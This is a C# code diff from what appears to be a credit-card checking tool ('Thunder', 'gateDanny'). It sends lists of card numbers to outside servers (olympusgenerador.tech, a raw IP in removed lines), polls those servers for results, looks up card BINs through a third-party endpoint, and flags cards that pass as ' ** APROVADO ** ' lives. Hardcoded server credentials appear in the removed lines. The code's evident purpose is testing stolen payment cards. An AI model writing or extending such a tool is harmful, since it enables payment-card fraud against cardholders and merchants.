@@ -31,7 +31,7 @@ namespace gateDanny.gates
             try
             {
                 string jsonString = "";
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
+                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://softoo.info/thunder/bin.php/?bin=" + bin);
                 request.Method = "GET";
                 request.Credentials = CredentialCache.DefaultCredentials;
                 ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
@@ -44,9 +44,7 @@ namespace gateDanny.gates
                 StreamReader sr = new StreamReader(response.GetResponseStream());
                 jsonString = sr.ReadToEnd();
                 sr.Close();
-                //MessageBox.Show(jsonString);
-                dynamic cc = JsonConvert.DeserializeObject(jsonString);
-                return cc.country.name;
+                return jsonString.Trim();
             }
             catch (Exception ex)
             {
@@ -212,24 +210,126 @@ namespace gateDanny.gates
             }
 
 
-            if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "6")
+            if (Thunder._Form1.numcc() > 0 && Variables.run)
             {
                 try
                 {
                     var ccs = Thunder._Form1.ccs();
-                    var client = new RestClient("http://23.98.148.62//olympus/ws-olympus/ajax/dead.php?op=guardarccsNN");
-                    client.Timeout = 10000;
+                    ccs = ccs.Replace("\r\n", "_");
+                    var client = new RestClient("https://olympusgenerador.tech/guardar/ajax/generador.php?op=insertTest");
+                    client.Timeout = -1;
                     var request = new RestRequest(Method.POST);
                     request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
-                    request.AddParameter("usuario", "pruebas1");
-                    request.AddParameter("clave", "olympusapk");
-                    request.AddParameter("ccs", ccs);
-                    request.AddParameter("id", "8865466789");
-                    request.AddParameter("gate", "7");
-                    request.AddParameter("ip", "28.26.12.2637");
+                    request.AddParameter("cc", ccs);
+                    request.AddParameter("usuario", Variables.key);
+                    request.AddParameter("identificador", Variables.identificador);
+                    request.AddParameter("estado", "test");
+                    request.AddParameter("gate", Variables.gate);
                     IRestResponse response = client.Execute(request);
                     Console.WriteLine(response.Content);
 
+                    var estado = false;
+                    Thread.Sleep(20000);
+                    Thunder._Form1.update_progresbar(5);
+                    Thread.Sleep(15000);
+                    Thunder._Form1.update_progresbar(10);
+                    Thread.Sleep(15000);
+                    Thunder._Form1.update_progresbar(20);
+                    Thread.Sleep(15000);
+                    Thunder._Form1.update_progresbar(30);
+                    Thread.Sleep(15000);
+                    Thunder._Form1.update_progresbar(40);
+                    Thread.Sleep(20000);
+                    Thunder._Form1.update_progresbar(50);
+
+                    while (estado == false)
+                    {
+                        Thunder._Form1.update_progresbar(60);
+                        try
+                        {
+                            var client2 = new RestClient("https://olympusgenerador.tech/guardar/ajax/generador.php?op=selectccserv");
+                            client2.Timeout = -1;
+                            var request2 = new RestRequest(Method.POST);
+                            request2.AddHeader("Content-Type", "application/x-www-form-urlencoded");
+                            request2.AddParameter("usuario", Variables.key);
+                            request2.AddParameter("identificador", Variables.identificador);
+                            IRestResponse response2 = client2.Execute(request2);
+                            Console.WriteLine(response2.Content);
+                            dynamic cc = JsonConvert.DeserializeObject(response2.Content);
+                            Thunder._Form1.update_progresbar(70);
+                            if ( cc.proceso=="")
+                            {
+                                estado = true;
+
+                            }
+
+                            string procesando = cc.proceso;
+                            string deads = cc.dead;
+                            string lives = cc.lives;
+
+                            Thread.Sleep(1000);
+
+
+                            string[] d = deads.Split('_');
+
+                            for(var i = 0; i < d.Length; i++)
+                            {
+                                if (Thunder._Form1.checktxtcc(d[i].Trim()))
+                                {
+
+                                }
+                                else
+                                {
+                                    if (d[i] != "")
+                                    {
+                                        var pais = "";
+                                        Thunder._Form1.update_progresbar(100);
+                                        var guardar = numeroTargeta + " - " + d[i] + " - " + pais + " " + Variables.gate;
+                                        // check.ccss(Variables.key, guardar, "deads");
+                                        Thread.Sleep(300);
+                                        Thunder._Form1.agragar_dead(d[i]);
+                                        Console.WriteLine("dead " + numeroTargeta + " - " + d[i] + " - " + correo + " - " + clave);
+                                        Thunder._Form1.remove_cc(0, d[i].Length);
+                                    }
+                                      
+                                }
+                            }
+
+                            string[] l = lives.Split('_');
+                                
+                            for (var i = 0; i < l.Length; i++)
+                            {
+                                if (Thunder._Form1.checktxtccliv(l[i].Trim()))
+                                {
+
+                                }
+                                else
+                                {
+                                    if (l[i] != "")
+                                    {
+                                        Thunder._Form1.update_progresbar(100);
+                                        var pais = checkbin(l[i].Substring(0, 6));
+                                        var guardar = numeroTargeta + " - " + l[i] + " - " + pais + " " + Variables.gate;
+                                        // check.ccss(Variables.key, guardar, "lives");
+                                        Thunder._Form1.agrgar_live(" ** APROVADO ** - " + l[i] + " - " + pais);
+                                        check.playlive();
+                                        Console.WriteLine("live " + numeroTargeta + " - " + l[i] + " - " + correo + " - " + clave);
+                                        Thunder._Form1.remove_cc(0, l[i].Length);
+                                    }
+                                   
+                                }
+                            }
+
+                            Thread.Sleep(10000);
+
+
+                        }
+                        catch (Exception ex)
+                        {
+
+                            Console.WriteLine(ex);
+                        }
+                    }
 
                 }
                 catch (Exception ex)
@@ -238,10 +338,6 @@ namespace gateDanny.gates
                     if (Variables.run == true)
                     {
                         restart();
-                    }
-                    else
-                    {
-                        Thunder._Form1.abort();
                     }
                 }
 
